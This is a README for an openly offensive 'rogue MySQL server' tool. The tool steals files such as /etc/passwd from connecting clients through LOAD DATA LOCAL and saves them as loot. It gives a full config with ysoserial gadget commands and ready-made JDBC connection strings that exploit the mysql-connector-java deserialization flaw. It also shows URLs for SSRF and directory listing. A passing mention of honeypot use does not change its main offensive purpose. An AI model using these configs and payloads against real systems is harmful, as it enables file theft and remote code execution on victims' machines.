# Rogue Mysql Server

A rouge mysql server based on https://github.com/vitessio/vitess, support common mysql libraries for multiple programming languages.  
No more annoying compatible problems. You can get tested libraries in the following table.

| language | library                        | pass |
|----------|--------------------------------|------|
| go       | github.com/go-sql-driver/mysql | ✔️   |
| php      | mysqli, pdo                    | ✔️   |
| python   | pymysql                        | ✔️   |
| java     | mysql-connector-java           | ✔️   |
| native   | 10.4.13-MariaDB                | ✔️   |

If you find this tool helped you, please star 🌟 this repository.

## Feature

* Compatible with common mysql libraries
* Capability for reading binary files
* Automatic save the file
* Optional password verification if you want to use it as honeypot
* Read client's connection attributes, which may contain some useful information
* For mysql-connector-java, have the ability to exploit deserialize vulnerability when the jdbc connection string is controlled by user

## Usage

Generate the template config file, you can skip this step if you already have it.
```sh
./rogue_mysql_server -generate
```

Run rouge mysql server using config.yaml.
```sh
./rogue_mysql_server
```

Or if you want to specify a config file.
```sh
./rogue_mysql_server -config other_config.yaml
```

## Config

Example:
```yaml
host: 0.0.0.0
port: 3306
# Listening ip address and port.

version_string: "10.4.13-MariaDB-log"
# What version string client will get.

file_list: ["/etc/passwd", "C:/boot.ini"]
save_path: ./loot
# File that waiting to read. Notice, it doesn't mean you can read all files by once (many mysql libraries don't support this feature).
# It actually will read one file in the list sequentially while the client send one query.

always_read: true
# If this option is set to true, the rouge server won't check the client's hint of whether it supports LOAD DATA LOCAL, and always try to read the file.
# Otherwise, the rouge server will respect the client's hint.

from_database_name: false
# If this option is set to true, the rogue server will get the filename from the database name provided by the client instead of `file_list`.
# E.g. `jdbc:mysql://localhost:3306/%2fetc%2fhosts?allowLoadLocalInfile=true`.
# The server will try to read `/etc/hosts` instead of the file in `file_list`.

max_file_size: 0
# Max size of the reading file (unit in bytes). Any content in the file that exceeds this size limit will be discarded.
# If the size is less than or equal to zero, meaning no limit on size.

auth: false
users:
  - root: root
  - root: password
# If set auth to `false`, the server won't check the client's auth username and password.
# Otherwise, it must match one of `users`.

jdbc_exploit: false
always_exploit: false
ysoserial_command:
  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']
# See section `mysql-connector-java deserialize vulnerability exploit`
```

## mysql-connector-java deserialize vulnerability exploit

After version 8.0.20 and 5.1.49, this vulnerability has been fixed.  
https://github.com/mysql/mysql-connector-j/commit/de7e1af306ffbb8118125a865998f64ee5b35b1b  
https://github.com/mysql/mysql-connector-j/commit/13f06c38fb68757607c460789196e3f798d506f2

The related configuration of vulnerability exploit is as follows.
```yaml
jdbc_exploit: false
always_exploit: false
ysoserial_command:
  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']
```

If `jdbc_exploit` is true, the server will automatically exploit the vulnerability if the client is mysql-connector-java. The `jdbc_exploit` will disable the function of file reading, meaning you can't read the client file and exploit deserialize vulnerability at the same time.
If `always_exploit` is true, the server won't check if the client is mysql-connector-java and always try to exploit deserialize vulnerability.
The `ysoserial_command` is the command that generates deserialize payload.

You can specify the payload that will be used by the parameter `connectionAttributes` in the jdbc connection string.  
The server will get the payload that key name equals the value of `t` in `connectionAttributes`. If not found, it will use first payload in `ysoserial_command` list.

For example:    
Exploit this vulnerability in version 8.x with payload cc7. The connection string is `jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:cc7&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password`

Be aware that the server only exploits `com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`, you can refer to the table below:

| version  | jdbc connection string                                                                                                                                                                                   |
|----------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 8.x      | jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password     |
| 6.x      | jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password |
| >=5.1.11 | jdbc:mysql://127.0.0.1:3306/test?connectionAttributes=t:{payload_name}&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=password    |

Additionally, the mysql-connector-java support use URL (like file://, http://) as filename, to achieve listing directory or SSRF, but you need set `allowLoadLocalInfile` to true in connection string.  
You can check details in [here](https://github.com/mysql/mysql-connector-j/blob/dd61577595edad45c398af508cf91ad26fc4144f/src/main/protocol-impl/java/com/mysql/cj/protocol/a/NativeProtocol.java#L1877)  
E.g.
* Listing `/` directory, `jdbc:mysql://127.0.0.1:3306/file%3A%2F%2F%2F?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
* SSRF `http://127.0.0.1:25565`, `jdbc:mysql://127.0.0.1:3306/http%3A%2F%2F127.0.0.1:25565?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`

## Ref

mysql-connector-java vulnerability exploit:  
https://github.com/fnmsd/MySQL_Fake_Server

mysql protocol related:  
https://github.com/mysql/mysql-connector-j  
https://github.com/vitessio/vitess  
https://github.com/src-d/go-mysql-server  
http://scz.617.cn:8/network/202001101612.txt  
